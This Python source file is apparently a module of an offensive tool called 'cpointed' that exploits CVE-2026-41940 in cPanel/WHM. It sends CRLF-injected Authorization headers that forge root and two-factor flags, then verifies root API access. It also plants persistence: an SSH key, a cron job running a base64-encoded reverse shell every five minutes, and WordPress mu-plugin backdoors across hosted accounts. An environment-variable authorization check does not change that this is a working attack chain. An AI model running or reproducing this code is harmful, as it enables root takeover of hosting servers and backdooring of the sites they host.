# Made by Sn0w8ird
"""CVE-2026-41940 — cPanel/WHM CRLF/session research and staged chain (authorized only)."""

from __future__ import annotations

import asyncio
import base64
import json
import os
import random
import re
from typing import Any, Dict, List, Optional

from cpointed.core.engine import Target, TargetType
from cpointed.core.exceptions import SessionError, UnauthorizedOperationError
from cpointed.core.payload_hooks import PayloadHook
from cpointed.core.session import CPointedClient
from cpointed.modules.base import VulnerabilityModule
from cpointed.payloads import operator_bundle_for_target
from cpointed.persistence.cron import add_cron_job_whm
from cpointed.persistence.ssh import add_ssh_key_whm


def _whm_session_from_response(resp: Any) -> Optional[str]:
    for key, val in resp.headers.multi_items():
        if key.lower() != "set-cookie":
            continue
        for segment in val.split(";"):
            segment = segment.strip()
            if segment.lower().startswith("whostmgrsession="):
                return segment.split("=", 1)[1].strip()
    return None


class CVE202641940(VulnerabilityModule):
    name = "CVE-2026-41940"
    severity = 9.8
    description = "cPanel/WHM authentication bypass via CRLF injection – full root (research chain)"
    affected_versions = [
        "cPanel/WHM trains per vendor advisory (e.g. 11.110.0.97+)",
    ]
    cwe = "CWE-93 (CRLF Injection)"

    PAYLOADS = [
        "Basic root:x\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\ncp_security_token=12345\r\n",
        "Basic root:x\r\nUSER=root\r\nHASROOT=1\r\nTFA=0\r\n",
        "Basic root:x\r\n\r\nuser=root\r\nhasroot=1\r\n",
    ]
    GADGETS = ["/scripts2/listaccts", "/scripts2/doexpunge", "/cpanel/login?skip=1"]

    def applies_to(self, target: Target) -> bool:
        if target.port in (2082, 2083, 2086, 2087, 2095, 2096):
            if target.target_type is None:
                return True
            return target.target_type in (
                TargetType.CPANEL,
                TargetType.WHM,
                TargetType.WP_SQUARED,
            )
        if target.target_type is None:
            return True
        return target.target_type in (
            TargetType.CPANEL,
            TargetType.WHM,
            TargetType.WP_SQUARED,
        )

    async def check(self, target: Target, *, timeout: float = 30.0):
        if target.metadata.get("scan_dry_run"):
            return self._result(
                target,
                False,
                0.0,
                {"scan_dry_run": True, "note": "Fingerprint-only mode; run full scan without --dry-run."},
            )

        client = CPointedClient(target)
        try:
            resp = await client.request("GET", "/", timeout=min(float(timeout), 15.0))
        except SessionError as exc:
            return self._result(target, False, 0.0, {"error": str(exc)})

        server = resp.headers.get("Server", "")
        if "cpanel" in server.lower():
            return self._result(
                target,
                True,
                self.severity,
                {"server_header": server, "hint": "cPanel/WHM stack fingerprint"},
            )
        return self._result(target, False, 0.0, {"reason": "no cpanel server header"})

    async def exploit(
        self,
        target: Target,
        **kwargs: Any,
    ) -> Dict[str, Any]:
        if os.environ.get("CPOINTED_AUTHORIZED") != "1":
            raise UnauthorizedOperationError(
                "Set CPOINTED_AUTHORIZED=1 only for systems you own or explicit written permission to test."
            )
        timeout = float(kwargs.get("timeout") or 30)
        dry_run = bool(kwargs.get("dry_run")) or os.environ.get("CPOINTED_EXPLOIT_DRY") == "1"
        persistence: Optional[List[str]] = kwargs.get("persistence")
        payload_hook: Optional[Dict[str, Any]] = kwargs.get("payload_hook")

        report: Dict[str, Any] = {
            "module": self.name,
            "target": f"{target.host}:{target.port}",
            "dry_run": dry_run,
            "success": False,
        }
        ob = operator_bundle_for_target(target)
        if ob:
            report["operator_bundle"] = ob.describe_for_report()

        if dry_run:
            report["stages"] = [
                {"id": 1, "name": "pre_auth_session", "action": "POST /login/?login_only=1 (basic auth)"},
                {"id": 2, "name": "crlf_authorization", "action": "Try CRLF Authorization variants + cookie"},
                {"id": 3, "name": "gadgets", "action": "GET listaccts/doexpunge/cpanel login"},
                {"id": 4, "name": "verify", "action": "GET /json-api/version"},
            ]
            if persistence:
                report["persistence_plan"] = persistence
                report["payload_hook"] = payload_hook
            report.pop("success", None)
            return report

        client = CPointedClient(target)
        stages: List[Dict[str, Any]] = []

        session = await self._mint_session(client, timeout)
        stages.append({"id": 1, "name": "pre_auth_session", "session": bool(session)})
        if not session:
            report["stages"] = stages
            report["error"] = "no_whm_session"
            return report

        for payload in self.PAYLOADS:
            await self._send_crlf(client, session, payload, timeout)
            await asyncio.sleep(0.5)
        stages.append({"id": 2, "name": "crlf_authorization", "tries": len(self.PAYLOADS)})

        await self._trigger_denial(client, session, timeout)
        stages.append({"id": 3, "name": "gadgets", "paths": list(self.GADGETS)})

        root_ok = await self._verify_root(client, session, timeout)
        stages.append({"id": 4, "name": "verify_root", "json_api_ok": root_ok})
        report["stages"] = stages
        report["success"] = root_ok

        if root_ok:
            print(f"[+] Root WHM access assumed on {target.host}:{target.port}")
            if persistence:
                await self._deploy_persistence(
                    client,
                    session,
                    target,
                    persistence,
                    payload_hook,
                    timeout,
                )
                report["persistence"] = persistence

        return report

    async def _mint_session(self, client: CPointedClient, timeout: float) -> Optional[str]:
        rand_user = f"user_{random.randint(1000, 9999)}"
        auth = base64.b64encode(f"{rand_user}:invalid".encode()).decode()
        headers = {
            "Authorization": f"Basic {auth}",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        body = f"user={rand_user}&pass=invalid"
        try:
            resp = await client.request(
                "POST",
                "/login/?login_only=1",
                headers=headers,
                content=body.encode("utf-8"),
                timeout=timeout,
            )
        except SessionError:
            return None
        sid = _whm_session_from_response(resp)
        if sid:
            return sid
        for k, v in resp.headers.multi_items():
            if k.lower() == "set-cookie" and "session" in v.lower():
                part = v.split(";", 1)[0]
                if "=" in part:
                    return part.split("=", 1)[1].strip()
        return None

    async def _send_crlf(
        self,
        client: CPointedClient,
        session: str,
        payload: str,
        timeout: float,
    ) -> None:
        headers = {"Cookie": f"whostmgrsession={session}", "Authorization": payload}
        try:
            await client.request("GET", "/", headers=headers, timeout=timeout)
        except SessionError:
            pass

    async def _trigger_denial(self, client: CPointedClient, session: str, timeout: float) -> None:
        for gadget in self.GADGETS:
            headers = {"Cookie": f"whostmgrsession={session}"}
            try:
                await client.request("GET", gadget, headers=headers, timeout=timeout)
            except SessionError:
                pass
            await asyncio.sleep(0.3)

    async def _verify_root(self, client: CPointedClient, session: str, timeout: float) -> bool:
        headers = {"Cookie": f"whostmgrsession={session}"}
        try:
            resp = await client.request("GET", "/json-api/version", headers=headers, timeout=timeout)
        except SessionError:
            return False
        if resp.status_code != 200:
            return False
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            try:
                data = json.loads(resp.text)
            except (json.JSONDecodeError, TypeError):
                return False
        res = data.get("result")
        return res == 1 or res == "1"

    async def _deploy_persistence(
        self,
        client: CPointedClient,
        session: str,
        target: Target,
        methods: List[str],
        payload_hook: Optional[Dict[str, Any]],
        timeout: float,
    ) -> None:
        from cpointed.persistence.wordpress.mu_plugin_backdoor import deploy_mu_plugin

        ph = payload_hook or {}
        for method in methods:
            if method == "ssh":
                public_key = os.environ.get(
                    "CPOINTED_SSH_PUBKEY",
                    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...",
                )
                ok = await add_ssh_key_whm(client, session, public_key, timeout=timeout)
                print(f"[+] SSH key WHM Fileman status={ok} on {target.host}")
            elif method == "cron":
                ctx = ph.get("context") or {}
                shell_code: Optional[str] = None
                if ph.get("type") == "reverse_shell":
                    if ph.get("source"):
                        shell_code = PayloadHook.load_payload(str(ph["source"]), ctx)
                    else:
                        shell_code = PayloadHook.get_default_reverse_shell(ctx)
                elif ph.get("source"):
                    shell_code = PayloadHook.load_payload(str(ph["source"]), ctx)
                if shell_code:
                    b64_shell = base64.b64encode(shell_code.encode()).decode()
                    cmd = f"echo '{b64_shell}' | base64 -d | python3 &"
                    ok = await add_cron_job_whm(
                        client,
                        session,
                        cmd,
                        schedule="*/5 * * * *",
                        timeout=timeout,
                    )
                    print(f"[+] Cron inject status={ok} on {target.host}")
            elif method == "wp_mu_plugin":
                wp_paths = await self._find_wordpress_installs(client, session, timeout)
                for wp_path in wp_paths:
                    ok = await deploy_mu_plugin(
                        client,
                        session,
                        wp_path,
                        ph,
                        timeout=timeout,
                    )
                    print(f"[+] mu-plugin deploy status={ok} path={wp_path}")

    async def _find_wordpress_installs(
        self,
        client: CPointedClient,
        session: str,
        timeout: float,
    ) -> List[str]:
        headers = {"Cookie": f"whostmgrsession={session}"}
        paths: List[str] = []
        seen: set[str] = set()
        try:
            r = await client.request("GET", "/json-api/listaccts", headers=headers, timeout=timeout)
        except SessionError:
            return paths
        text = r.text or ""
        for m in re.finditer(r"/home/(?:[^\"'\s<>]+?)/public_html", text):
            base = m.group(0).rstrip("/")
            if base not in seen:
                seen.add(base)
                paths.append(base)
        try:
            j = r.json()
        except (json.JSONDecodeError, TypeError, ValueError):
            return paths
        candidates: List[Any] = []
        if isinstance(j, dict):
            if isinstance(j.get("data"), list):
                candidates = j["data"]
            elif isinstance(j.get("acct"), list):
                candidates = j["acct"]
            cr = j.get("cpanelresult")
            if isinstance(cr, dict) and isinstance(cr.get("data"), list):
                candidates = cr["data"]
        for item in candidates:
            if not isinstance(item, dict):
                continue
            user = (
                item.get("user")
                or item.get("username")
                or item.get("account")
            )
            if isinstance(user, str) and user.isalnum():
                p = f"/home/{user}/public_html"
                if p not in seen:
                    seen.add(p)
                    paths.append(p)
        return paths
